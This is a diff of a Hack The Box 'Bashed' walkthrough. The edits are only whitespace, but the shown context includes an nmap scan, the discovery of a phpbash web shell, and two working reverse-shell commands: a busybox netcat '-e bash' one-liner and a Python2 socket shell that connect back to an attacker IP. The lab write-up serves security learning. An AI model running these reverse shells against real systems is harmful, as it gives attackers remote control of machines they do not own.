@@ -31,7 +31,6 @@ Bashed is a fairly easy machine which focuses mainly on fuzzing and locating imp
 ## Nmap
 
 ```bash
-
 # Nmap 7.94 scan initiated Fri Sep 29 18:07:49 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 80 bashed.htb
 Nmap scan report for bashed.htb (10.129.1.104)
 Host is up, received user-set (0.056s latency).
@@ -47,7 +46,6 @@ PORT   STATE SERVICE REASON         VERSION
 
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-
 # Nmap done at Fri Sep 29 18:08:12 2023 -- 1 IP address (1 host up) scanned in 22.74 seconds
 ```
 
@@ -133,6 +131,7 @@ Visit http://bashed.htb/dev/phpbash.php which was discovered by **feroxbuster**
 Now get a reverse shell
 
 > **Revshell cheat sheet**
+> 
 > Another amazing tool I discovered during htb battlegrounds
 > > https://github.com/H0j3n/EzpzShell
 {: .prompt-tip }
@@ -142,10 +141,8 @@ Tried some `bash`, `python3` and `netcat` reverse shells, none of them worked
 These worked:
 
 ```bash
-
 # (Trick) Solve nc version issue : use the nc from busybox
 busybox nc 10.10.16.13 1111 -e bash
-
 
 # Python2 revshell
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.13",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
